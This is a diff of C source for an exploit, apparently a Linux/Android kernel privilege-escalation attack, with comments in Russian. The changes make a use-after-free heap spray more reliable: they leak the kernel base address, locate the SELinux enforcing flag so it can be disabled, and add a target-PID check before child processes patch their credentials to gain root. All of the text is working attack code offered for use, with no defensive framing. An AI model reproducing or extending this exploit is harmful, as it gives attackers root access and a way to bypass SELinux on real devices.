@@ -2521,7 +2521,7 @@ restart:;
         double ram_usage = get_ram_usage_percentage();
         fprintf(stderr, "\r    [*] Sprayed: %d | RAM Usage: %.1f%% ... ", total_sprayed, ram_usage);
         
-        int reached_mem_limit = (ram_usage > 90.0);
+        int reached_mem_limit = (ram_usage > 70.0);
         
         if (!reached_mem_limit) {
             // Спреим пачку
@@ -2534,7 +2534,11 @@ restart:;
                     prctl(PR_SET_PDEATHSIG, SIGKILL);
                     
                     while(1) { 
-                        if (gbuf[0] == 0xab) safe_cred_patch();
+                        if (gbuf[0] == 0xab) {
+                            if (getpid() == (pid_t)(*(uint64_t *)&gbuf[GBUF_TARGET_PID])) {
+                                safe_cred_patch();
+                            }
+                        }
                         usleep(100000); 
                     }
                     exit(0);
@@ -2555,23 +2559,41 @@ restart:;
             
             int num_found = 0;
             if (scan_uaf_for_nonzero_multi(fd, NULL, &num_found)) {
-                fprintf(stderr, "\n    [!!!] SUCCESS! Marker found at %d processes\n", total_sprayed);
-                marker_found_global = 1;
-                break; 
-            } else {
-                fprintf(stderr, "\n    [-] Marker not found. Cleaning up old sprays to free memory...\n");
-                // Убиваем все созданные процессы
-                for (int i = 0; i < total_sprayed; i++) {
-                    if (spray_ctrl[i].pid > 0) {
-                        kill(spray_ctrl[i].pid, SIGKILL);
-                        waitpid(spray_ctrl[i].pid, NULL, 0);
-                        spray_ctrl[i].pid = 0;
+                uint64_t leaked_base = find_kernel_base_from_task_va(*(uint64_t *)&gbuf[GBUF_TASK_VA]);
+                if (leaked_base != 0) {
+                    kernel_base = leaked_base;
+                    uint64_t auto_offset = find_offsets_auto(kernel_base);
+                    selinux_enforcing = kernel_base + (auto_offset != 0 ? auto_offset : SELINUX_OFFSET);
+                    
+                    if (selinux_enforcing == kernel_base + SELINUX_OFFSET) {
+                        selinux_enforcing = find_selinux_enforcing_via_kbase(fd, kernel_base);
                     }
+
+                    if (selinux_enforcing != 0) {
+                        fprintf(stderr, "\n    [!!!] SUCCESS! Marker found, KBASE=0x%lx, SELINUX=0x%lx\n", 
+                                (unsigned long)kernel_base, (unsigned long)selinux_enforcing);
+                        marker_found_global = 1;
+                        break;
+                    } else {
+                        fprintf(stderr, "\n    [-] Marker found but failed to locate SELINUX. Continuing...\n");
+                    }
+                } else {
+                    fprintf(stderr, "\n    [-] Marker found but failed to leak KBASE. Continuing...\n");
                 }
-                fprintf(stderr, "    [+] Memory cleared. Continuing spray from %d...\n", total_sprayed);
-                // Продолжаем цикл, total_sprayed не сбрасываем, но память теперь свободна
-                usleep(1000000); // Ждем освобождения ресурсов системой
             }
+            
+            // Если не нашли ИЛИ нашли не всё, чистим память
+            fprintf(stderr, "\n    [-] Total success not reached. Cleaning up old sprays to free memory...\n");
+            // Убиваем все созданные процессы
+            for (int i = 0; i < total_sprayed; i++) {
+                if (spray_ctrl[i].pid > 0) {
+                    kill(spray_ctrl[i].pid, SIGKILL);
+                    waitpid(spray_ctrl[i].pid, NULL, 0);
+                    spray_ctrl[i].pid = 0;
+                }
+            }
+            fprintf(stderr, "    [+] Memory cleared. Continuing spray from %d...\n", total_sprayed);
+            usleep(1000000); 
         }
     }
 
@@ -2595,44 +2617,34 @@ restart:;
         }
     }
 
-    uint64_t kbase = (*(uint64_t *)&gbuf[0x20]);
-    if (kbase != 0)
-    {
-        kernel_base = kbase;
-        fprintf(stderr, "[+] Kernel base: 0x%lx\n", (unsigned long)kbase);
-    }
-    else
-    {
+    // -----------------------------------------------------------------------
+    // [13] Kernel address resolution
+    // -----------------------------------------------------------------------
+    if (kernel_base == 0) {
         uint64_t task_va = *(uint64_t *)&gbuf[GBUF_TASK_VA];
-        if (task_va != 0)
-        {
+        if (task_va != 0) {
             kernel_base = find_kernel_base_from_task_va(task_va);
         }
-        if (kernel_base == 0)
-        {
+        if (kernel_base == 0) {
             kernel_base = get_kernel_base();
         }
-        fprintf(stderr, "[+] Kernel base: 0x%lx\n", (unsigned long)kernel_base);
     }
+    fprintf(stderr, "[+] Kernel base: 0x%lx\n", (unsigned long)kernel_base);
 
-    uint64_t init_cred = kbase + INIT_TASK_OFFSET;
-    uint64_t poweroff_cmd = kbase + 0x2BB8EC0;
-    uint64_t orderly_poweroff = kbase + 0x5F96C;
-    uint64_t memstart_addr = kbase + 0x24C2538;
-    if (kbase != 0)
+    uint64_t init_cred = kernel_base + INIT_TASK_OFFSET;
+    uint64_t poweroff_cmd = kernel_base + 0x2BB8EC0;
+    uint64_t orderly_poweroff = kernel_base + 0x5F96C;
+    uint64_t memstart_addr = kernel_base + 0x24C2538;
+
+    if (selinux_enforcing == 0)
     {
-        uint64_t auto_offset = find_offsets_auto(kbase);
-        selinux_enforcing = kbase + (auto_offset != 0 ? auto_offset : SELINUX_OFFSET);
+        uint64_t auto_offset = find_offsets_auto(kernel_base);
+        selinux_enforcing = kernel_base + (auto_offset != 0 ? auto_offset : SELINUX_OFFSET);
         
-        if (selinux_enforcing == 0 || selinux_enforcing == kbase + SELINUX_OFFSET)
+        if (selinux_enforcing == 0 || selinux_enforcing == kernel_base + SELINUX_OFFSET)
         {
-            // Aggressive scan
-            selinux_enforcing = find_selinux_enforcing_via_kbase(fd, kbase);
+            selinux_enforcing = find_selinux_enforcing_via_kbase(fd, kernel_base);
         }
-    }
-    else
-    {
-        selinux_enforcing = 0;
     }
     *(uint64_t *)&gbuf[GBUF_SET_TASKS] = selinux_enforcing;
 
